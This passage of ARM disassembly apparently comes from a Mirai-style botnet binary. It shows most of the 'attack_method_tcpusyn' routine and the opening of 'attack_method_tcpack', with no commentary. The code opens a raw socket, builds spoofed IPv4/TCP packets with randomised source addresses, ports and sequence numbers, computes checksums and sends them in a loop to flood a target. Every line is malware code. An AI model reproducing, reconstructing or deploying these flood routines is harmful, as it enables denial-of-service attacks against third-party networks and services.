    c45c:	e3a03801 	mov	r3, #65536	; 0x10000
    c460:	e1a0c000 	mov	ip, r0
    c464:	e20cc0ff 	and	ip, ip, #255	; 0xff
    c468:	e2433001 	sub	r3, r3, #1
    c46c:	e3a02003 	mov	r2, #3
    c470:	e1a01005 	mov	r1, r5
    c474:	e1a00004 	mov	r0, r4
    c478:	e58dc048 	str	ip, [sp, #72]	; 0x48
    c47c:	ebfff827 	bl	a520 <attack_get_opt_int>
    c480:	e1a01005 	mov	r1, r5
    c484:	e58d0024 	str	r0, [sp, #36]	; 0x24
    c488:	e3a02004 	mov	r2, #4
    c48c:	e3a03040 	mov	r3, #64	; 0x40
    c490:	e1a00004 	mov	r0, r4
    c494:	ebfff821 	bl	a520 <attack_get_opt_int>
    c498:	e1a0c000 	mov	ip, r0
    c49c:	e20cc0ff 	and	ip, ip, #255	; 0xff
    c4a0:	e1a01005 	mov	r1, r5
    c4a4:	e3a02005 	mov	r2, #5
    c4a8:	e3a03001 	mov	r3, #1
    c4ac:	e1a00004 	mov	r0, r4
    c4b0:	e58dc050 	str	ip, [sp, #80]	; 0x50
    c4b4:	ebfff819 	bl	a520 <attack_get_opt_int>
    c4b8:	e3a03801 	mov	r3, #65536	; 0x10000
    c4bc:	e1a0c000 	mov	ip, r0
    c4c0:	e20cc0ff 	and	ip, ip, #255	; 0xff
    c4c4:	e2433001 	sub	r3, r3, #1
    c4c8:	e3a02006 	mov	r2, #6
    c4cc:	e1a01005 	mov	r1, r5
    c4d0:	e1a00004 	mov	r0, r4
    c4d4:	e58dc054 	str	ip, [sp, #84]	; 0x54
    c4d8:	ebfff810 	bl	a520 <attack_get_opt_int>
    c4dc:	e3a03801 	mov	r3, #65536	; 0x10000
    c4e0:	e1a01005 	mov	r1, r5
    c4e4:	e2433001 	sub	r3, r3, #1
    c4e8:	e3a02007 	mov	r2, #7
    c4ec:	e1a0b000 	mov	fp, r0
    c4f0:	e1a00004 	mov	r0, r4
    c4f4:	ebfff809 	bl	a520 <attack_get_opt_int>
    c4f8:	e3a03801 	mov	r3, #65536	; 0x10000
    c4fc:	e1a01005 	mov	r1, r5
    c500:	e2433001 	sub	r3, r3, #1
    c504:	e3a02011 	mov	r2, #17
    c508:	e1a06000 	mov	r6, r0
    c50c:	e1a00004 	mov	r0, r4
    c510:	ebfff802 	bl	a520 <attack_get_opt_int>
    c514:	e1a01005 	mov	r1, r5
    c518:	e58d0028 	str	r0, [sp, #40]	; 0x28
    c51c:	e3a02012 	mov	r2, #18
    c520:	e3a03000 	mov	r3, #0
    c524:	e1a00004 	mov	r0, r4
    c528:	ebfff7fc 	bl	a520 <attack_get_opt_int>
    c52c:	e1a01005 	mov	r1, r5
    c530:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    c534:	e3a0200b 	mov	r2, #11
    c538:	e3a03001 	mov	r3, #1
    c53c:	e1a00004 	mov	r0, r4
    c540:	ebfff7f6 	bl	a520 <attack_get_opt_int>
    c544:	e1a01005 	mov	r1, r5
    c548:	e58d0030 	str	r0, [sp, #48]	; 0x30
    c54c:	e3a0200c 	mov	r2, #12
    c550:	e3a03000 	mov	r3, #0
    c554:	e1a00004 	mov	r0, r4
    c558:	ebfff7f0 	bl	a520 <attack_get_opt_int>
    c55c:	e1a01005 	mov	r1, r5
    c560:	e58d0034 	str	r0, [sp, #52]	; 0x34
    c564:	e3a0200d 	mov	r2, #13
    c568:	e3a03000 	mov	r3, #0
    c56c:	e1a00004 	mov	r0, r4
    c570:	ebfff7ea 	bl	a520 <attack_get_opt_int>
    c574:	e1a01005 	mov	r1, r5
    c578:	e58d0038 	str	r0, [sp, #56]	; 0x38
    c57c:	e3a0200e 	mov	r2, #14
    c580:	e3a03000 	mov	r3, #0
    c584:	e1a00004 	mov	r0, r4
    c588:	ebfff7e4 	bl	a520 <attack_get_opt_int>
    c58c:	e1a01005 	mov	r1, r5
    c590:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    c594:	e3a0200f 	mov	r2, #15
    c598:	e3a03001 	mov	r3, #1
    c59c:	e1a00004 	mov	r0, r4
    c5a0:	ebfff7de 	bl	a520 <attack_get_opt_int>
    c5a4:	e1a01005 	mov	r1, r5
    c5a8:	e58d0040 	str	r0, [sp, #64]	; 0x40
    c5ac:	e3a02010 	mov	r2, #16
    c5b0:	e3a03000 	mov	r3, #0
    c5b4:	e1a00004 	mov	r0, r4
    c5b8:	ebfff7d8 	bl	a520 <attack_get_opt_int>
    c5bc:	e59f2508 	ldr	r2, [pc, #1288]	; cacc <attack_method_tcpusyn+0x6a8>
    c5c0:	e58d0044 	str	r0, [sp, #68]	; 0x44
    c5c4:	e5923000 	ldr	r3, [r2]
    c5c8:	e1a01005 	mov	r1, r5
    c5cc:	e3a02019 	mov	r2, #25
    c5d0:	e1a00004 	mov	r0, r4
    c5d4:	ebfff7b6 	bl	a4b4 <attack_get_opt_ip>
    c5d8:	e3a01003 	mov	r1, #3
    c5dc:	e58d0060 	str	r0, [sp, #96]	; 0x60
    c5e0:	e3a02006 	mov	r2, #6
    c5e4:	e3a00002 	mov	r0, #2
    c5e8:	eb0031cd 	bl	18d24 <__GI_socket>
    c5ec:	e3700001 	cmn	r0, #1
    c5f0:	e1a0a000 	mov	sl, r0
    c5f4:	0a000131 	beq	cac0 <attack_method_tcpusyn+0x69c>
    c5f8:	e28d3070 	add	r3, sp, #112	; 0x70
    c5fc:	e3a02001 	mov	r2, #1
    c600:	e5232004 	str	r2, [r3, #-4]!
    c604:	e3a0c004 	mov	ip, #4
    c608:	e3a01000 	mov	r1, #0
    c60c:	e2822002 	add	r2, r2, #2
    c610:	e58dc000 	str	ip, [sp]
    c614:	eb0031b0 	bl	18cdc <__GI_setsockopt>
    c618:	e3700001 	cmn	r0, #1
    c61c:	0a000125 	beq	cab8 <attack_method_tcpusyn+0x694>
    c620:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    c624:	e3a02000 	mov	r2, #0
    c628:	e1a00801 	lsl	r0, r1, #16
    c62c:	e1a0480b 	lsl	r4, fp, #16
    c630:	e1a05806 	lsl	r5, r6, #16
    c634:	e58d206c 	str	r2, [sp, #108]	; 0x6c
    c638:	e59d2030 	ldr	r2, [sp, #48]	; 0x30
    c63c:	e1a03820 	lsr	r3, r0, #16
    c640:	e1a06824 	lsr	r6, r4, #16
    c644:	e1a01825 	lsr	r1, r5, #16
    c648:	e3570000 	cmp	r7, #0
    c64c:	e58d304c 	str	r3, [sp, #76]	; 0x4c
    c650:	e58d6058 	str	r6, [sp, #88]	; 0x58
    c654:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    c658:	e202b0ff 	and	fp, r2, #255	; 0xff
    c65c:	0a000092 	beq	c8ac <attack_method_tcpusyn+0x488>
    c660:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    c664:	e1a0e803 	lsl	lr, r3, #16
    c668:	e1a03c06 	lsl	r3, r6, #24
    c66c:	e59d604c 	ldr	r6, [sp, #76]	; 0x4c
    c670:	e1a02c01 	lsl	r2, r1, #24
    c674:	e1a0140e 	lsl	r1, lr, #8
    c678:	e1a01821 	lsr	r1, r1, #16
    c67c:	e1a00c20 	lsr	r0, r0, #24
    c680:	e206c0ff 	and	ip, r6, #255	; 0xff
    c684:	e181ec2e 	orr	lr, r1, lr, lsr #24
    c688:	e180c40c 	orr	ip, r0, ip, lsl #8
    c68c:	e28d0030 	add	r0, sp, #48	; 0x30
    c690:	e8900003 	ldm	r0, {r0, r1}
    c694:	e1a03823 	lsr	r3, r3, #16
    c698:	e1a02822 	lsr	r2, r2, #16
    c69c:	e2000001 	and	r0, r0, #1
    c6a0:	e2011001 	and	r1, r1, #1
    c6a4:	e1836c24 	orr	r6, r3, r4, lsr #24
    c6a8:	e1825c25 	orr	r5, r2, r5, lsr #24
    c6ac:	e58d000c 	str	r0, [sp, #12]
    c6b0:	e58d1010 	str	r1, [sp, #16]
    c6b4:	e28d2038 	add	r2, sp, #56	; 0x38
    c6b8:	e892000c 	ldm	r2, {r2, r3}
    c6bc:	e28d0040 	add	r0, sp, #64	; 0x40
    c6c0:	e8900003 	ldm	r0, {r0, r1}
    c6c4:	e2022001 	and	r2, r2, #1
    c6c8:	e2033001 	and	r3, r3, #1
    c6cc:	e2000001 	and	r0, r0, #1
    c6d0:	e2011001 	and	r1, r1, #1
    c6d4:	e58de064 	str	lr, [sp, #100]	; 0x64
    c6d8:	e58dc008 	str	ip, [sp, #8]
    c6dc:	e58d2014 	str	r2, [sp, #20]
    c6e0:	e58d3018 	str	r3, [sp, #24]
    c6e4:	e58d001c 	str	r0, [sp, #28]
    c6e8:	e58d1020 	str	r1, [sp, #32]
    c6ec:	e3a04000 	mov	r4, #0
    c6f0:	e3a01001 	mov	r1, #1
    c6f4:	e3a00080 	mov	r0, #128	; 0x80
    c6f8:	eb00346b 	bl	198ac <calloc>
    c6fc:	e59d206c 	ldr	r2, [sp, #108]	; 0x6c
    c700:	e7890104 	str	r0, [r9, r4, lsl #2]
    c704:	e1a03282 	lsl	r3, r2, #5
    c708:	e7994102 	ldr	r4, [r9, r2, lsl #2]
    c70c:	e0433182 	sub	r3, r3, r2, lsl #3
    c710:	e0830008 	add	r0, r3, r8
    c714:	e5d43000 	ldrb	r3, [r4]
    c718:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    c71c:	e3833040 	orr	r3, r3, #64	; 0x40
    c720:	e5c43000 	strb	r3, [r4]
    c724:	e5d42000 	ldrb	r2, [r4]
    c728:	e3c2200a 	bic	r2, r2, #10
    c72c:	e3822005 	orr	r2, r2, #5
    c730:	e59d3054 	ldr	r3, [sp, #84]	; 0x54
    c734:	e5c42000 	strb	r2, [r4]
    c738:	e59d1048 	ldr	r1, [sp, #72]	; 0x48
    c73c:	e5c41001 	strb	r1, [r4, #1]
    c740:	e59d2050 	ldr	r2, [sp, #80]	; 0x50
    c744:	e3530000 	cmp	r3, #0
    c748:	e3a03b0f 	mov	r3, #15360	; 0x3c00
    c74c:	e5c42008 	strb	r2, [r4, #8]
    c750:	e1c430b2 	strh	r3, [r4, #2]
    c754:	e3a03006 	mov	r3, #6
    c758:	e59d1008 	ldr	r1, [sp, #8]
    c75c:	13a02040 	movne	r2, #64	; 0x40
    c760:	e5c43009 	strb	r3, [r4, #9]
    c764:	11c420b6 	strhne	r2, [r4, #6]
    c768:	e59d2060 	ldr	r2, [sp, #96]	; 0x60
    c76c:	e584200c 	str	r2, [r4, #12]
    c770:	e5903010 	ldr	r3, [r0, #16]
    c774:	e1c410b4 	strh	r1, [r4, #4]
    c778:	e5843010 	str	r3, [r4, #16]
    c77c:	e1c461b4 	strh	r6, [r4, #20]
    c780:	e2841014 	add	r1, r4, #20
    c784:	e5d1300c 	ldrb	r3, [r1, #12]
    c788:	e5d1200d 	ldrb	r2, [r1, #13]
    c78c:	e59d000c 	ldr	r0, [sp, #12]
    c790:	e3c33050 	bic	r3, r3, #80	; 0x50
    c794:	e38330a0 	orr	r3, r3, #160	; 0xa0
    c798:	e3c22020 	bic	r2, r2, #32
    c79c:	e5c1300c 	strb	r3, [r1, #12]
    c7a0:	e1822280 	orr	r2, r2, r0, lsl #5
    c7a4:	e59d3064 	ldr	r3, [sp, #100]	; 0x64
    c7a8:	e5c1200d 	strb	r2, [r1, #13]
    c7ac:	e5813004 	str	r3, [r1, #4]
    c7b0:	e5d1300d 	ldrb	r3, [r1, #13]
    c7b4:	e59d0010 	ldr	r0, [sp, #16]
    c7b8:	e3c33010 	bic	r3, r3, #16
    c7bc:	e1833200 	orr	r3, r3, r0, lsl #4
    c7c0:	e5c1300d 	strb	r3, [r1, #13]
    c7c4:	e5d1200d 	ldrb	r2, [r1, #13]
    c7c8:	e59d3014 	ldr	r3, [sp, #20]
    c7cc:	e3c22008 	bic	r2, r2, #8
    c7d0:	e1822183 	orr	r2, r2, r3, lsl #3
    c7d4:	e1c150b2 	strh	r5, [r1, #2]
    c7d8:	e5c1200d 	strb	r2, [r1, #13]
    c7dc:	e5d1300d 	ldrb	r3, [r1, #13]
    c7e0:	e59d0018 	ldr	r0, [sp, #24]
    c7e4:	e3c33004 	bic	r3, r3, #4
    c7e8:	e1833100 	orr	r3, r3, r0, lsl #2
    c7ec:	e5c1300d 	strb	r3, [r1, #13]
    c7f0:	e5d1200d 	ldrb	r2, [r1, #13]
    c7f4:	e59d301c 	ldr	r3, [sp, #28]
    c7f8:	e3c22002 	bic	r2, r2, #2
    c7fc:	e1822083 	orr	r2, r2, r3, lsl #1
    c800:	e5c1200d 	strb	r2, [r1, #13]
    c804:	e5d1300d 	ldrb	r3, [r1, #13]
    c808:	e59d0020 	ldr	r0, [sp, #32]
    c80c:	e3c33001 	bic	r3, r3, #1
    c810:	e1803003 	orr	r3, r0, r3
    c814:	e5c1300d 	strb	r3, [r1, #13]
    c818:	e3a02004 	mov	r2, #4
    c81c:	e3a01002 	mov	r1, #2
    c820:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    c824:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    c828:	eb0016fc 	bl	12420 <rand_next>
    c82c:	e200000f 	and	r0, r0, #15
    c830:	e2800e57 	add	r0, r0, #1392	; 0x570
    c834:	e2800008 	add	r0, r0, #8
    c838:	e1a00800 	lsl	r0, r0, #16
    c83c:	e1a03420 	lsr	r3, r0, #8
    c840:	e2033cff 	and	r3, r3, #65280	; 0xff00
    c844:	e1833c20 	orr	r3, r3, r0, lsr #24
    c848:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    c84c:	e3a03004 	mov	r3, #4
    c850:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    c854:	e3a0200a 	mov	r2, #10
    c858:	e3a03008 	mov	r3, #8
    c85c:	e3a00002 	mov	r0, #2
    c860:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    c864:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    c868:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    c86c:	eb0016eb 	bl	12420 <rand_next>
    c870:	e3a02006 	mov	r2, #6
    c874:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    c878:	e3a01003 	mov	r1, #3
    c87c:	e3a03000 	mov	r3, #0
    c880:	e3a02001 	mov	r2, #1
    c884:	e5840030 	str	r0, [r4, #48]	; 0x30
    c888:	e5843034 	str	r3, [r4, #52]	; 0x34
    c88c:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    c890:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    c894:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    c898:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c89c:	e0834002 	add	r4, r3, r2
    c8a0:	e1540007 	cmp	r4, r7
    c8a4:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    c8a8:	baffff90 	blt	c6f0 <attack_method_tcpusyn+0x2cc>
    c8ac:	e3a03000 	mov	r3, #0
    c8b0:	e3570000 	cmp	r7, #0
    c8b4:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    c8b8:	0afffffb 	beq	c8ac <attack_method_tcpusyn+0x488>
    c8bc:	e1a00003 	mov	r0, r3
    c8c0:	e1a03280 	lsl	r3, r0, #5
    c8c4:	e0433180 	sub	r3, r3, r0, lsl #3
    c8c8:	e0833008 	add	r3, r3, r8
    c8cc:	e5d32014 	ldrb	r2, [r3, #20]
    c8d0:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    c8d4:	e352001f 	cmp	r2, #31
    c8d8:	e2856014 	add	r6, r5, #20
    c8dc:	9a00003b 	bls	c9d0 <attack_method_tcpusyn+0x5ac>
    c8e0:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    c8e4:	e3730001 	cmn	r3, #1
    c8e8:	0a000050 	beq	ca30 <attack_method_tcpusyn+0x60c>
    c8ec:	e3a04801 	mov	r4, #65536	; 0x10000
    c8f0:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    c8f4:	e2444001 	sub	r4, r4, #1
    c8f8:	e1500004 	cmp	r0, r4
    c8fc:	0a000052 	beq	ca4c <attack_method_tcpusyn+0x628>
    c900:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    c904:	e1510004 	cmp	r1, r4
    c908:	0a000054 	beq	ca60 <attack_method_tcpusyn+0x63c>
    c90c:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    c910:	e1520004 	cmp	r2, r4
    c914:	0a000056 	beq	ca74 <attack_method_tcpusyn+0x650>
    c918:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    c91c:	e1530004 	cmp	r3, r4
    c920:	0a000058 	beq	ca88 <attack_method_tcpusyn+0x664>
    c924:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    c928:	e1500004 	cmp	r0, r4
    c92c:	0a00005a 	beq	ca9c <attack_method_tcpusyn+0x678>
    c930:	e35b0000 	cmp	fp, #0
    c934:	1a00005c 	bne	caac <attack_method_tcpusyn+0x688>
    c938:	e3a01000 	mov	r1, #0
    c93c:	e1c510ba 	strh	r1, [r5, #10]
    c940:	e1a00005 	mov	r0, r5
    c944:	e3a01014 	mov	r1, #20
    c948:	eb00079b 	bl	e7bc <checksum_generic>
    c94c:	e3a02000 	mov	r2, #0
    c950:	e1c500ba 	strh	r0, [r5, #10]
    c954:	e1a01006 	mov	r1, r6
    c958:	e1c621b0 	strh	r2, [r6, #16]
    c95c:	e3a03028 	mov	r3, #40	; 0x28
    c960:	e3a02b0a 	mov	r2, #10240	; 0x2800
    c964:	e1a00005 	mov	r0, r5
    c968:	eb0007a7 	bl	e80c <checksum_tcpudp>
    c96c:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c970:	e1a0e283 	lsl	lr, r3, #5
    c974:	e1c601b0 	strh	r0, [r6, #16]
    c978:	e04ee183 	sub	lr, lr, r3, lsl #3
    c97c:	e1d660b2 	ldrh	r6, [r6, #2]
    c980:	e08ee008 	add	lr, lr, r8
    c984:	e1ce60b2 	strh	r6, [lr, #2]
    c988:	e3a03901 	mov	r3, #16384	; 0x4000
    c98c:	e3a0c010 	mov	ip, #16
    c990:	e1a01005 	mov	r1, r5
    c994:	e1a0000a 	mov	r0, sl
    c998:	e3a0203c 	mov	r2, #60	; 0x3c
    c99c:	e58de000 	str	lr, [sp]
    c9a0:	e58dc004 	str	ip, [sp, #4]
    c9a4:	eb0030aa 	bl	18c54 <__libc_sendto>
    c9a8:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c9ac:	e2830001 	add	r0, r3, #1
    c9b0:	e1500007 	cmp	r0, r7
    c9b4:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    c9b8:	baffffc0 	blt	c8c0 <attack_method_tcpusyn+0x49c>
    c9bc:	e3a03000 	mov	r3, #0
    c9c0:	e3570000 	cmp	r7, #0
    c9c4:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    c9c8:	0affffb7 	beq	c8ac <attack_method_tcpusyn+0x488>
    c9cc:	eaffffba 	b	c8bc <attack_method_tcpusyn+0x498>
    c9d0:	e5934010 	ldr	r4, [r3, #16]
    c9d4:	eb001691 	bl	12420 <rand_next>
    c9d8:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    c9dc:	e1a01283 	lsl	r1, r3, #5
    c9e0:	e0411183 	sub	r1, r1, r3, lsl #3
    c9e4:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    c9e8:	e1a02c24 	lsr	r2, r4, #24
    c9ec:	e182242c 	orr	r2, r2, ip, lsr #8
    c9f0:	e0811008 	add	r1, r1, r8
    c9f4:	e2043cff 	and	r3, r4, #65280	; 0xff00
    c9f8:	e5d1c014 	ldrb	ip, [r1, #20]
    c9fc:	e1822403 	orr	r2, r2, r3, lsl #8
    ca00:	e1822c04 	orr	r2, r2, r4, lsl #24
    ca04:	e0822c30 	add	r2, r2, r0, lsr ip
    ca08:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    ca0c:	e1a03c22 	lsr	r3, r2, #24
    ca10:	e1833420 	orr	r3, r3, r0, lsr #8
    ca14:	e2021cff 	and	r1, r2, #65280	; 0xff00
    ca18:	e1833401 	orr	r3, r3, r1, lsl #8
    ca1c:	e1833c02 	orr	r3, r3, r2, lsl #24
    ca20:	e5853010 	str	r3, [r5, #16]
    ca24:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    ca28:	e3730001 	cmn	r3, #1
    ca2c:	1affffae 	bne	c8ec <attack_method_tcpusyn+0x4c8>
    ca30:	eb00167a 	bl	12420 <rand_next>
    ca34:	e3a04801 	mov	r4, #65536	; 0x10000
    ca38:	e585000c 	str	r0, [r5, #12]
    ca3c:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    ca40:	e2444001 	sub	r4, r4, #1
    ca44:	e1500004 	cmp	r0, r4
    ca48:	1affffac 	bne	c900 <attack_method_tcpusyn+0x4dc>
    ca4c:	eb001673 	bl	12420 <rand_next>
    ca50:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    ca54:	e1510004 	cmp	r1, r4
    ca58:	e1c500b4 	strh	r0, [r5, #4]
    ca5c:	1affffaa 	bne	c90c <attack_method_tcpusyn+0x4e8>
    ca60:	eb00166e 	bl	12420 <rand_next>
    ca64:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    ca68:	e1520004 	cmp	r2, r4
    ca6c:	e1c501b4 	strh	r0, [r5, #20]
    ca70:	1affffa8 	bne	c918 <attack_method_tcpusyn+0x4f4>
    ca74:	eb001669 	bl	12420 <rand_next>
    ca78:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    ca7c:	e1530004 	cmp	r3, r4
    ca80:	e1c600b2 	strh	r0, [r6, #2]
    ca84:	1affffa6 	bne	c924 <attack_method_tcpusyn+0x500>
    ca88:	eb001664 	bl	12420 <rand_next>
    ca8c:	e5860004 	str	r0, [r6, #4]
    ca90:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    ca94:	e1500004 	cmp	r0, r4
    ca98:	1affffa4 	bne	c930 <attack_method_tcpusyn+0x50c>
    ca9c:	eb00165f 	bl	12420 <rand_next>
    caa0:	e35b0000 	cmp	fp, #0
    caa4:	e5860008 	str	r0, [r6, #8]
    caa8:	0affffa2 	beq	c938 <attack_method_tcpusyn+0x514>
    caac:	eb00165b 	bl	12420 <rand_next>
    cab0:	e1c601b2 	strh	r0, [r6, #18]
    cab4:	eaffff9f 	b	c938 <attack_method_tcpusyn+0x514>
    cab8:	e1a0000a 	mov	r0, sl
    cabc:	eb003a8b 	bl	1b4f0 <__GI___libc_close>
    cac0:	e28dd074 	add	sp, sp, #116	; 0x74
    cac4:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    cac8:	e12fff1e 	bx	lr
    cacc:	0002c58c 	andeq	ip, r2, ip, lsl #11

0000cad0 <attack_method_tcpack>:
    cad0:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    cad4:	e1a08001 	mov	r8, r1
    cad8:	e24dd074 	sub	sp, sp, #116	; 0x74
    cadc:	e3a01004 	mov	r1, #4
    cae0:	e1a04002 	mov	r4, r2
    cae4:	e1a05003 	mov	r5, r3
    cae8:	e1a07000 	mov	r7, r0
    caec:	eb00336e 	bl	198ac <calloc>
    caf0:	e1a01005 	mov	r1, r5
    caf4:	e3a02002 	mov	r2, #2
    caf8:	e3a03000 	mov	r3, #0
    cafc:	e1a09000 	mov	r9, r0
    cb00:	e1a00004 	mov	r0, r4
    cb04:	ebfff685 	bl	a520 <attack_get_opt_int>
    cb08:	e3a03801 	mov	r3, #65536	; 0x10000
    cb0c:	e1a0c000 	mov	ip, r0
    cb10:	e20cc0ff 	and	ip, ip, #255	; 0xff
    cb14:	e2433001 	sub	r3, r3, #1
    cb18:	e3a02003 	mov	r2, #3
    cb1c:	e1a01005 	mov	r1, r5
    cb20:	e1a00004 	mov	r0, r4
    cb24:	e58dc048 	str	ip, [sp, #72]	; 0x48
    cb28:	ebfff67c 	bl	a520 <attack_get_opt_int>
    cb2c:	e1a01005 	mov	r1, r5
    cb30:	e58d0024 	str	r0, [sp, #36]	; 0x24
    cb34:	e3a02004 	mov	r2, #4
    cb38:	e3a03040 	mov	r3, #64	; 0x40
    cb3c:	e1a00004 	mov	r0, r4
    cb40:	ebfff676 	bl	a520 <attack_get_opt_int>
    cb44:	e1a0c000 	mov	ip, r0
    cb48:	e20cc0ff 	and	ip, ip, #255	; 0xff
    cb4c:	e1a01005 	mov	r1, r5
    cb50:	e3a02005 	mov	r2, #5
    cb54:	e3a03001 	mov	r3, #1
    cb58:	e1a00004 	mov	r0, r4
    cb5c:	e58dc050 	str	ip, [sp, #80]	; 0x50
    cb60:	ebfff66e 	bl	a520 <attack_get_opt_int>
    cb64:	e3a03801 	mov	r3, #65536	; 0x10000
    cb68:	e1a0c000 	mov	ip, r0
    cb6c:	e20cc0ff 	and	ip, ip, #255	; 0xff
    cb70:	e2433001 	sub	r3, r3, #1
    cb74:	e3a02006 	mov	r2, #6
    cb78:	e1a01005 	mov	r1, r5
    cb7c:	e1a00004 	mov	r0, r4
    cb80:	e58dc054 	str	ip, [sp, #84]	; 0x54
    cb84:	ebfff665 	bl	a520 <attack_get_opt_int>
    cb88:	e3a03801 	mov	r3, #65536	; 0x10000
    cb8c:	e1a01005 	mov	r1, r5
    cb90:	e2433001 	sub	r3, r3, #1
    cb94:	e3a02007 	mov	r2, #7
    cb98:	e1a0b000 	mov	fp, r0
    cb9c:	e1a00004 	mov	r0, r4
    cba0:	ebfff65e 	bl	a520 <attack_get_opt_int>
    cba4:	e3a03801 	mov	r3, #65536	; 0x10000
    cba8:	e1a01005 	mov	r1, r5
    cbac:	e2433001 	sub	r3, r3, #1
    cbb0:	e3a02011 	mov	r2, #17
    cbb4:	e1a06000 	mov	r6, r0
    cbb8:	e1a00004 	mov	r0, r4
    cbbc:	ebfff657 	bl	a520 <attack_get_opt_int>
    cbc0:	e1a01005 	mov	r1, r5
    cbc4:	e58d0028 	str	r0, [sp, #40]	; 0x28
    cbc8:	e3a02012 	mov	r2, #18
    cbcc:	e3a03000 	mov	r3, #0
    cbd0:	e1a00004 	mov	r0, r4
    cbd4:	ebfff651 	bl	a520 <attack_get_opt_int>
    cbd8:	e1a01005 	mov	r1, r5
    cbdc:	e58d002c 	str	r0, [sp, #44]	; 0x2c
    cbe0:	e3a0200b 	mov	r2, #11
    cbe4:	e3a03000 	mov	r3, #0
    cbe8:	e1a00004 	mov	r0, r4
    cbec:	ebfff64b 	bl	a520 <attack_get_opt_int>
    cbf0:	e1a01005 	mov	r1, r5
    cbf4:	e58d0030 	str	r0, [sp, #48]	; 0x30
    cbf8:	e3a0200c 	mov	r2, #12
    cbfc:	e3a03001 	mov	r3, #1
    cc00:	e1a00004 	mov	r0, r4
    cc04:	ebfff645 	bl	a520 <attack_get_opt_int>
    cc08:	e1a01005 	mov	r1, r5
    cc0c:	e58d0034 	str	r0, [sp, #52]	; 0x34
    cc10:	e3a0200d 	mov	r2, #13
    cc14:	e3a03000 	mov	r3, #0
    cc18:	e1a00004 	mov	r0, r4
    cc1c:	ebfff63f 	bl	a520 <attack_get_opt_int>
    cc20:	e1a01005 	mov	r1, r5
    cc24:	e58d0038 	str	r0, [sp, #56]	; 0x38
    cc28:	e3a0200e 	mov	r2, #14
    cc2c:	e3a03000 	mov	r3, #0
    cc30:	e1a00004 	mov	r0, r4
    cc34:	ebfff639 	bl	a520 <attack_get_opt_int>
    cc38:	e1a01005 	mov	r1, r5
    cc3c:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    cc40:	e3a0200f 	mov	r2, #15
    cc44:	e3a03000 	mov	r3, #0
    cc48:	e1a00004 	mov	r0, r4
    cc4c:	ebfff633 	bl	a520 <attack_get_opt_int>
    cc50:	e1a01005 	mov	r1, r5
    cc54:	e58d0040 	str	r0, [sp, #64]	; 0x40
    cc58:	e3a02010 	mov	r2, #16
    cc5c:	e3a03000 	mov	r3, #0
    cc60:	e1a00004 	mov	r0, r4
    cc64:	ebfff62d 	bl	a520 <attack_get_opt_int>
    cc68:	e59f2508 	ldr	r2, [pc, #1288]	; d178 <attack_method_tcpack+0x6a8>
    cc6c:	e58d0044 	str	r0, [sp, #68]	; 0x44
    cc70:	e5923000 	ldr	r3, [r2]
    cc74:	e1a01005 	mov	r1, r5
    cc78:	e3a02019 	mov	r2, #25
    cc7c:	e1a00004 	mov	r0, r4
    cc80:	ebfff60b 	bl	a4b4 <attack_get_opt_ip>
    cc84:	e3a01003 	mov	r1, #3
    cc88:	e58d0060 	str	r0, [sp, #96]	; 0x60
    cc8c:	e3a02006 	mov	r2, #6
    cc90:	e3a00002 	mov	r0, #2
    cc94:	eb003022 	bl	18d24 <__GI_socket>
    cc98:	e3700001 	cmn	r0, #1
    cc9c:	e1a0a000 	mov	sl, r0
    cca0:	0a000131 	beq	d16c <attack_method_tcpack+0x69c>
    cca4:	e28d3070 	add	r3, sp, #112	; 0x70
    cca8:	e3a02001 	mov	r2, #1
    ccac:	e5232004 	str	r2, [r3, #-4]!
    ccb0:	e3a0c004 	mov	ip, #4
    ccb4:	e3a01000 	mov	r1, #0
    ccb8:	e2822002 	add	r2, r2, #2
    ccbc:	e58dc000 	str	ip, [sp]
    ccc0:	eb003005 	bl	18cdc <__GI_setsockopt>
    ccc4:	e3700001 	cmn	r0, #1
    ccc8:	0a000125 	beq	d164 <attack_method_tcpack+0x694>
    cccc:	e59d1024 	ldr	r1, [sp, #36]	; 0x24
    ccd0:	e3a02000 	mov	r2, #0
    ccd4:	e1a00801 	lsl	r0, r1, #16
    ccd8:	e1a0480b 	lsl	r4, fp, #16
    ccdc:	e1a05806 	lsl	r5, r6, #16
